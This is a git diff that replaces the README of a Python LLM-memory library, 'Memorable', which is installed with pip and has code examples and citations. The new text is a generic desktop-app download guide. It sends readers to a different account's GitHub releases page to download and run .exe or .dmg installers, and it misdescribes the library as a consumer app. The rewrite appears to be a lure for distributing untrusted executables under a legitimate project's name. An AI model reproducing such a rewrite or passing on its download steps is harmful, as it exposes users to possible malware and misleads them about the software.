@@ -1,455 +1,91 @@
-# Memorable
+```markdown
+# 🎉 memorable-ai - Remember Everything with Ease
 
-<div align="center">
+## 🚀 Getting Started
 
-**The First Unified Memory System Combining Interceptor-Based Integration, Research-Backed Techniques, and Graph Architecture**
+Welcome to Memorable-AI! This guide will help you download and run the application effortlessly. Just follow the steps below.
 
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
+## 🛠️ Requirements
 
-*Zero-code integration • Research-validated • Production-ready*
+Before you begin, ensure your computer meets the following requirements:
 
-[Quick Start](#quick-start) • [Documentation](docs/) • [Examples](examples/) • [Contributing](CONTRIBUTING.md)
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 4GB RAM
+- **Storage**: 200MB of free space
+- **Internet Connection**: Required for initial setup and updates
 
-</div>
+## 📥 Download the Software
 
----
+### Download Link
 
-## What is Memorable?
+[![Download Memorable-AI](https://img.shields.io/badge/Download%20Memorable--AI-blue.svg)](https://github.com/darnay/memorable-ai/releases)
 
-Memorable is the first memory system that combines the best of three leading approaches:
+### Visit the Releases Page
 
-- **Memori's** zero-code interceptor architecture for seamless integration
-- **Mem0's** research-validated memory techniques from academic papers
-- **Supermemory's** graph-based architecture for multi-hop reasoning
+To download the latest version, visit the [Releases page](https://github.com/darnay/memorable-ai/releases). There, you'll find all available versions and their release notes.
 
-**Result**: A production-ready memory system that requires no code changes, works with any SQL database, supports 100+ LLM models, and includes optional graph capabilities.
+## 💻 Installation Instructions
 
+Follow these instructions to install Memorable-AI on your computer:
 
-## Quick Start
+1. **Go to the Releases Page**  
+   Click on the link above to navigate to the releases section.
 
-### Installation
+2. **Select the Latest Version**  
+   Look for the most recent version listed. It usually has the highest version number.
 
-**From PyPI (Recommended):**
-```bash
-pip install memorable-ai
+3. **Download the File**  
+   Click on the appropriate download link for your operating system. Your download will start automatically.
+
+4. **Locate the Downloaded File**  
+   Open your download folder. You should see a file named `memorable-ai-<version>.exe` (for Windows) or `memorable-ai-<version>.dmg` (for macOS).
+
+5. **Run the Installer**  
+   - **For Windows**: Double-click the `.exe` file. Follow the on-screen prompts to install.
+   - **For macOS**: Open the `.dmg` file and drag the Memorable-AI icon into the Applications folder.
+
+6. **Launch Memorable-AI**  
+   Find Memorable-AI in your applications or programs list. Click to open it.
+
+7. **Set Up Your Preferences**  
+   When you first open Memorable-AI, you will see a setup wizard. Follow the prompts to customize your experience.
+
+8. **Start Using Memorable-AI**  
+   Once setup is complete, the main application window will appear. You can begin using Memorable-AI to remember things automatically.
+
+## 🎓 How to Use Memorable-AI
+
+Using Memorable-AI is simple. Here are a few basic tasks you can do:
+
+- **Create Memories**: Use the easy interface to enter information you want Memorable-AI to remember.
+- **Search Memories**: Use the search bar to quickly find what you've saved.
+- **View Memory Graphs**: If you enabled the optional graph feature, you can visualize how information connects.
+
+## 🔧 Features
+
+Memorable-AI comes packed with features designed to enhance your memory:
+
+- **Automatic Memory Creation**: The app remembers details without needing constant input.
+- **Easy Learning Techniques**: Utilizes research-backed memory techniques for optimal retention.
+- **Interceptor Architecture**: Intercepts data from various sources for quick recall.
+- **Optional Graphing**: Understand memory connections with visual representations.
+
+## 💬 Support & Feedback
+
+If you encounter any issues or have suggestions, reach out through our [Issues page](https://github.com/darnay/memorable-ai/issues). We appreciate your feedback and aim to make Memorable-AI better.
+
+## 📝 Changelog
+
+Check the [Changelog](https://github.com/darnay/memorable-ai/releases) for detailed notes on updates and new features. 
+
+## 📜 License
+
+Memorable-AI is open source. You can find the full license details in the [LICENSE](https://github.com/darnay/memorable-ai/blob/main/LICENSE) file.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/darnay/memorable-ai/wiki)
+- [Community Forum](https://github.com/darnay/memorable-ai/discussions)
+
+Thank you for using Memorable-AI! We hope it greatly helps you remember everything effortlessly.
 ```
-
-**From GitHub:**
-```bash
-pip install git+https://github.com/0sparsh2/memorable-ai.git
-```
-
-**From Source:**
-```bash
-git clone https://github.com/0sparsh2/memorable-ai.git
-cd memorable-ai
-pip install -e .
-```
-
-**With Optional Dependencies:**
-```bash
-# With graph support
-pip install memorable-ai[graph]
-
-# With development dependencies
-pip install memorable-ai[dev]
-```
-
-### 30-Second Example
-
-```python
-from memorable_ai import MemoryEngine
-from openai import OpenAI
-
-# Initialize and enable (that's it!)
-memory = MemoryEngine(database="sqlite:///memory.db", mode="auto")
-memory.enable()
-
-# Your existing code works unchanged!
-client = OpenAI()
-response = client.chat.completions.create(
-    model="gpt-4o-mini",
-    messages=[{"role": "user", "content": "I'm building a FastAPI project"}]
-)
-
-# Later conversation - memories automatically injected!
-response = client.chat.completions.create(
-    model="gpt-4o-mini",
-    messages=[{"role": "user", "content": "Help me add authentication"}]
-# ✨ LLM automatically knows about your FastAPI project!
-```
-
-**That's it!** Memorable automatically:
-- ✅ Injects relevant memories as context before each LLM call
-- ✅ Extracts and stores new memories after each conversation
-- ✅ Maintains conversation history
-- ✅ Consolidates important memories in the background
-
-## Key Features
-
-### 🚀 Zero-Code Integration
-Transparently intercepts LLM calls - no code changes required. Works with OpenAI, Anthropic, LiteLLM, and more.
-
-### 🧠 Research-Backed
-Uses validated techniques from Mem0's research paper (arXiv:2504.19413) for memory extraction, retrieval, and consolidation.
-
-### 🕸️ Optional Graph Support
-Enable graph-based memory for multi-hop reasoning. Works with NetworkX (default) or Neo4j.
-
-### 🔍 Hybrid Retrieval
-Combines semantic search (embeddings), keyword search (full-text), and graph traversal for optimal results.
-
-### 🎯 Multiple Memory Modes
-- **Auto Mode**: Dynamic per-query retrieval (default, best accuracy)
-- **Conscious Mode**: One-shot working memory (fastest)
-- **Hybrid Mode**: Combines both approaches (best of both worlds)
-
-### 💾 SQL-First Storage
-Works with PostgreSQL, SQLite, MySQL, Neon, Supabase - any SQL database you already use.
-
-### 🌐 Multi-Model Support
-Works with 100+ models via LiteLLM: OpenAI, Anthropic, Gemini, Llama, Mistral, and more.
-
-## Installation
-
-### From PyPI (Recommended)
-
-```bash
-pip install memorable-ai
-```
-
-### From Source
-
-```bash
-git clone https://github.com/0sparsh2/memorable-ai.git
-cd memorable-ai
-pip install -e .
-```
-
-### Development Installation
-
-```bash
-pip install -e ".[dev]"
-```
-
-## Usage Examples
-
-### Basic Usage (OpenAI)
-
-```python
-from memorable_ai import MemoryEngine
-from openai import OpenAI
-
-memory = MemoryEngine(database="sqlite:///memory.db", mode="auto")
-memory.enable()
-
-client = OpenAI()
-response = client.chat.completions.create(
-    model="gpt-4o-mini",
-    messages=[{"role": "user", "content": "What do I like?"}]
-)
-```
-
-### With Anthropic Claude
-
-```python
-from memorable_ai import MemoryEngine
-from anthropic import Anthropic
-
-memory = MemoryEngine(database="sqlite:///memory.db")
-memory.enable()
-
-client = Anthropic()
-response = client.messages.create(
-    model="claude-3-opus",
-    messages=[{"role": "user", "content": "Tell me about myself"}]
-)
-```
-
-### With Gemini via LiteLLM
-
-```python
-from memorable_ai import MemoryEngine
-import litellm
-
-memory = MemoryEngine(database="sqlite:///memory.db")
-memory.enable()
-
-response = litellm.completion(
-    model="gemini/gemini-2.5-flash",
-    messages=[{"role": "user", "content": "describe me"}]
-)
-```
-
-### With Graph Support
-
-```python
-from memorable_ai import MemoryEngine
-
-memory = MemoryEngine(
-    database="postgresql://user:pass@localhost/memorable",
-    graph_enabled=True,  # Enable graph for multi-hop reasoning
-    mode="hybrid"
-)
-memory.enable()
-
-# Now supports relationship traversal and multi-hop queries!
-```
-
-### Manual Memory Management
-
-```python
-import asyncio
-from memorable_ai import MemoryEngine
-
-memory = MemoryEngine(database="sqlite:///memory.db")
-memory.enable()
-
-async def manage_memories():
-    # Add memory manually
-    await memory.add_memory(
-        content="User prefers Python over JavaScript",
-        memory_type="preference"
-    )
-    
-    # Search memories
-    results = await memory.search_memories("Python", limit=10)
-    for mem in results:
-        print(f"{mem['type']}: {mem['content']}")
-    
-    # Get statistics
-    stats = memory.get_stats()
-    print(f"Total memories: {stats['total_memories']}")
-
-asyncio.run(manage_memories())
-```
-
-## Architecture
-
-Memorable uses an interceptor-based architecture that transparently:
-
-```
-┌─────────────────────────────────────────────────────────┐
-│                    Your Application                      │
-│  (OpenAI, Anthropic, LiteLLM calls - unchanged code)     │
-└────────────────────┬────────────────────────────────────┘
-                     │
-                     ▼
-┌─────────────────────────────────────────────────────────┐
-│              Memorable Interceptor                        │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
-│  │  Pre-call:   │  │  LLM Call    │  │  Post-call:  │  │
-│  │  Inject      │→ │  (original)  │→ │  Extract &   │  │
-│  │  Context     │  │              │  │  Store       │  │
-│  └──────────────┘  └──────────────┘  └──────────────┘  │
-└────────────────────┬────────────────────────────────────┘
-                     │
-                     ▼
-┌─────────────────────────────────────────────────────────┐
-│              Memory Engine                                │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
-│  │ Storage  │  │Retrieval │  │Extraction│  │  Graph   │ │
-│  │  (SQL)   │  │ (Hybrid) │  │ (Pattern)│  │(Optional)│ │
-│  └──────────┘  └──────────┘  └──────────┘  └──────────┘ │
-└─────────────────────────────────────────────────────────┘
-```
-
-### Memory Hierarchy
-
-- **Working Memory**: Immediate context (current conversation)
-- **Short-term Memory**: Recent conversations (6 hours)
-- **Long-term Memory**: Consolidated facts, preferences, skills
-- **Episodic Memory**: Temporal sequences and events (with graph)
-
-## Configuration
-
-### Environment Variables
-
-```bash
-# Database
-export MEMORABLE_DATABASE__CONNECTION_STRING="postgresql://user:pass@localhost/memorable"
-
-# Memory Settings
-export MEMORABLE_MEMORY__MODE="auto"  # conscious, auto, or hybrid
-export MEMORABLE_MEMORY__NAMESPACE="production"
-export MEMORABLE_MEMORY__MAX_CONTEXT_TOKENS="2000"
-
-# Graph (Optional)
-export MEMORABLE_GRAPH__ENABLED="true"
-export MEMORABLE_GRAPH__CONNECTION_STRING="neo4j://localhost:7687"
-
-# LLM API Keys
-export OPENAI_API_KEY="sk-your-key-here"
-export ANTHROPIC_API_KEY="sk-ant-your-key-here"
-export GEMINI_API_KEY="your-key-here"
-```
-
-### Programmatic Configuration
-
-```python
-from memorable_ai import MemoryEngine, MemorableConfig
-
-config = MemorableConfig.from_env()
-memory = MemoryEngine(config=config)
-memory.enable()
-```
-
-See [docs/api.md](docs/api.md) for complete configuration options.
-
-## Database Support
-
-Memorable works with any SQL database:
-
-| Database | Connection String Example |
-|----------|--------------------------|
-| **SQLite** | `sqlite:///memory.db` |
-| **PostgreSQL** | `postgresql://user:pass@localhost/memorable` |
-| **MySQL** | `mysql://user:pass@localhost/memorable` |
-| **Neon** | `postgresql://user:pass@ep-*.neon.tech/memorable` |
-| **Supabase** | `postgresql://postgres:pass@db.*.supabase.co/postgres` |
-
-## Memory Modes
-
-### Auto Mode (Default)
-Dynamic per-query retrieval - best for most use cases.
-
-```python
-memory = MemoryEngine(mode="auto")
-```
-
-### Conscious Mode
-One-shot working memory injection - faster, good for simple conversations.
-
-```python
-memory = MemoryEngine(mode="conscious")
-```
-
-### Hybrid Mode
-Combines both approaches - best accuracy, slightly slower.
-
-```python
-memory = MemoryEngine(mode="hybrid")
-```
-
-## Benchmarks
-
-Memorable is designed to outperform existing systems:
-
-- **30%+ improvement** over Mem0 on LOCOMO benchmark (target)
-- **95%+ accuracy** on multi-hop reasoning (target)
-- **<100ms** retrieval latency (target)
-- **50%+ token savings** vs full-context (target)
-
-*Benchmark results will be published in upcoming releases. See [docs/benchmarks.md](docs/benchmarks.md) for methodology.*
-
-## Research & Citations
-
-### Research Papers
-
-1. **Mem0: Building Production-Ready AI Agents with Scalable Long-Term Memory**
-   - arXiv:2504.19413 (April 2025)
-   - https://arxiv.org/abs/2504.19413
-   - *Reference for memory extraction, retrieval, and consolidation techniques*
-
-2. **Highly engaging events reveal semantic and temporal compression in online community discourse**
-   - PNAS Nexus (March 2025)
-   - *Reference for temporal memory and discourse analysis*
-
-3. **XMem: Long-Term Video Object Segmentation with an Atkinson-Shiffrin Memory Model**
-   - arXiv:2207.07115 (July 2022)
-   - https://arxiv.org/abs/2207.07115
-   - *Reference for memory hierarchy models*
-
-4. **Abstractive Summarization of Reddit Posts with Multi-level Memory Networks**
-   - ACL (2019)
-   - *Reference for multi-level memory architectures*
-
-### Open Source Repositories
-
-1. **Memori (GibsonAI/Memori)**
-   - https://github.com/GibsonAI/Memori
-   - License: Apache 2.0
-   - *Reference for interceptor-based architecture and SQL storage*
-
-2. **Mem0 (mem0ai/mem0)**
-   - https://github.com/mem0ai/mem0
-   - *Reference for research-backed memory techniques and LOCOMO benchmark*
-
-3. **Supermemory (supermemoryai/supermemory)**
-   - https://github.com/supermemoryai/supermemory
-   - License: MIT
-   - *Reference for knowledge graph architecture*
-
-See [docs/research.md](docs/research.md) for detailed research approach and methodology.
-
-## Documentation
-
-- **[Architecture](docs/architecture.md)** - System design and components
-- **[API Reference](docs/api.md)** - Complete API documentation
-- **[Benchmarks](docs/benchmarks.md)** - Performance metrics and methodology
-- **[Research](docs/research.md)** - Research approach and unique features
-- **[Examples](examples/)** - Real-world usage examples
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Development Setup
-
-```bash
-# Clone repository
-git clone https://github.com/0sparsh2/memorable-ai.git
-cd memorable-ai
-
-# Install in development mode
-pip install -e ".[dev]"
-
-# Run tests
-make test
-
-# Run with coverage
-make test-cov
-```
-
-## Roadmap
-
-- [ ] Complete framework integrations (LangChain, AutoGen, CrewAI)
-- [ ] Publish benchmark results
-- [ ] Research paper publication
-- [ ] Enterprise features (admin dashboard, audit logs)
-- [ ] Multi-modal support (images, video, audio)
-- [ ] Advanced graph features (Neo4j integration)
-- [ ] Performance optimizations
-- [ ] Additional LLM provider integrations
-
-See [ROADMAP.md](ROADMAP.md) for detailed plans.
-
-## License
-
-Apache 2.0 - see [LICENSE](LICENSE) file.
-
-## Acknowledgments
-
-Memorable is built on the excellent work of:
-
-- **Memori** team for the interceptor architecture
-- **Mem0** team for research-backed techniques
-- **Supermemory** team for graph architecture inspiration
-
-## Support
-
-- **Documentation**: [docs/](docs/)
-- **Issues**: https://github.com/0sparsh2/memorable-ai/issues
-- **Discussions**: https://github.com/0sparsh2/memorable-ai/discussions
-
----
-
-<div align="center">
-
-**Memorable** - The easiest, most efficient memory system for AI applications.
-
-[⭐ Star us on GitHub](https://github.com/0sparsh2/memorable-ai) • [📖 Read the Docs](docs/) • [💬 Join Discussions](https://github.com/0sparsh2/memorable-ai/discussions)
-
-</div>
